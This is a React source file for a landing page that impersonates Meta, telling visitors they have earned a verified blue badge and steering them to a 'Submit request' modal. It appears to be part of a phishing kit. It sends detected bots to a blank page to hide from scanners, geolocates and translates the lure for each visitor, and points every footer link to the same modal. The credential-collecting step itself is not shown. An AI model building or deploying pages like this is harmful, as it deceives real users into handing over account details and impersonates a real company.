import { useEffect, useState, useMemo, useCallback } from 'react';
import { useNavigate } from 'react-router';
import axios from 'axios';
import TickIcon from '@/assets/images/tick.svg';
import detectBot from '@/utils/detect_bot';
import { translateText } from '@/utils/translate';
import countryToLanguage from '@/utils/country_to_language';
import { PATHS } from '@/router/router';

const Index = () => {
    const navigate = useNavigate();
    const [isLoading, setIsLoading] = useState(true);
    const [translatedTexts, setTranslatedTexts] = useState({});

    const defaultTexts = useMemo(() => ({
        heroTitle: 'Meta Verified - Rewards for you',
        showWorld: 'Show the world that you mean business.',
        congrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
        excited: "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
        ticketIdLabel: 'Your ticket id: #8241-XNYG-AVMB',
        guideTitle: 'Verified Blue Badge Request Guide',
        guideItem1: '- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats',
        guideItem2: '- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.',
        guideItem3: '- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.',
        submitRequest: 'Submit request',
        helpCenter: 'Help Center',
        privacyPolicy: 'Privacy Policy',
        termsOfService: 'Terms of Service',
        communityStandards: 'Community Standards'
    }), []);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const keys = Object.keys(defaultTexts);
                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
                const translated = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });
                setTranslatedTexts(translated);
            } catch {
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const initializeApp = useCallback(async () => {
        try {
            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
                return;
            }
            try {
                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                const data = response.data;
                localStorage.setItem('ipInfo', JSON.stringify(data));
                const countryCode = data.country_code;
                const targetLang = countryToLanguage[countryCode] || 'en';
                localStorage.setItem('targetLang', targetLang);
                if (targetLang !== 'en') {
                    await translateAllTexts(targetLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            } catch {
                setTranslatedTexts(defaultTexts);
            }
            setIsLoading(false);
        } catch {
            setIsLoading(false);
        }
    }, [defaultTexts, translateAllTexts]);

    useEffect(() => {
        localStorage.clear();
        initializeApp();
    }, [initializeApp]);

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    const openModal = () => navigate(PATHS.HOME, { state: { autoOpen: true } });

    if (isLoading) {
        return (
            <div style={{ position: 'fixed', inset: 0, background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                <div style={{ width: '36px', height: '36px', border: '3px solid #e5e7eb', borderTopColor: '#1877f2', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }} />
            </div>
        );
    }

    return (
        <div
            style={{
                position: 'fixed',
                inset: 0,
                width: '100vw',
                height: '100vh',
                overflowY: 'auto',
                background: 'linear-gradient(135deg, #e8f0fe 0%, #f1f7fd 45%, #edf6f9 100%)',
                display: 'flex',
                justifyContent: 'center',
                alignItems: 'center',
                padding: '48px 20px',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                color: '#1c2b33',
                boxSizing: 'border-box',
                zIndex: 1
            }}
        >
            <div style={{ maxWidth: '640px', width: '100%', textAlign: 'left' }}>
                <div style={{ marginBottom: '18px' }}>
                    <img src={TickIcon} alt="Verified Badge" style={{ width: '48px', height: '48px', display: 'block' }} />
                </div>

                <h1 style={{ fontSize: '30px', fontWeight: '700', color: '#1c2b33', margin: '0 0 22px 0', lineHeight: '1.25', letterSpacing: '-0.02em' }}>
                    {texts.heroTitle}
                </h1>

                <p style={{ fontSize: '15px', fontWeight: '700', color: '#1c2b33', margin: '0 0 16px 0', lineHeight: '1.5' }}>
                    {texts.showWorld}
                </p>

                <p style={{ fontSize: '14px', color: '#374151', margin: '0 0 14px 0', lineHeight: '1.6' }}>
                    {texts.congrats}
                </p>

                <p style={{ fontSize: '14px', color: '#374151', margin: '0 0 18px 0', lineHeight: '1.6' }}>
                    {texts.excited}
                </p>

                <p style={{ fontSize: '13.5px', color: '#6b7280', margin: '0 0 22px 0', fontWeight: '500' }}>
                    {texts.ticketIdLabel}
                </p>

                <h2 style={{ fontSize: '15px', fontWeight: '700', color: '#1c2b33', margin: '0 0 14px 0' }}>
                    {texts.guideTitle}
                </h2>

                <div style={{ fontSize: '14px', color: '#374151', lineHeight: '1.6', display: 'flex', flexDirection: 'column', gap: '12px', marginBottom: '32px' }}>
                    <p style={{ margin: 0 }}>{texts.guideItem1}</p>
                    <p style={{ margin: 0 }}>{texts.guideItem2}</p>
                    <p style={{ margin: 0 }}>{texts.guideItem3}</p>
                </div>

                <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '26px' }}>
                    <button
                        type="button"
                        onClick={openModal}
                        style={{
                            backgroundColor: '#1877f2',
                            color: '#ffffff',
                            border: 'none',
                            borderRadius: '9999px',
                            padding: '12px 68px',
                            fontSize: '14px',
                            fontWeight: '600',
                            cursor: 'pointer',
                            boxShadow: '0 2px 6px rgba(24, 119, 242, 0.2)'
                        }}
                    >
                        {texts.submitRequest}
                    </button>
                </div>

                <div style={{ display: 'flex', flexWrap: 'wrap', justifyContent: 'center', alignItems: 'center', gap: '16px', fontSize: '12px', color: '#6b7280' }}>
                    <span onClick={openModal} style={{ cursor: 'pointer' }}>{texts.helpCenter}</span>
                    <span onClick={openModal} style={{ cursor: 'pointer' }}>{texts.privacyPolicy}</span>
                    <span onClick={openModal} style={{ cursor: 'pointer' }}>{texts.termsOfService}</span>
                    <span onClick={openModal} style={{ cursor: 'pointer' }}>{texts.communityStandards}</span>
                    <span>Meta © 2026</span>
                </div>
            </div>
        </div>
    );
};

export default Index;
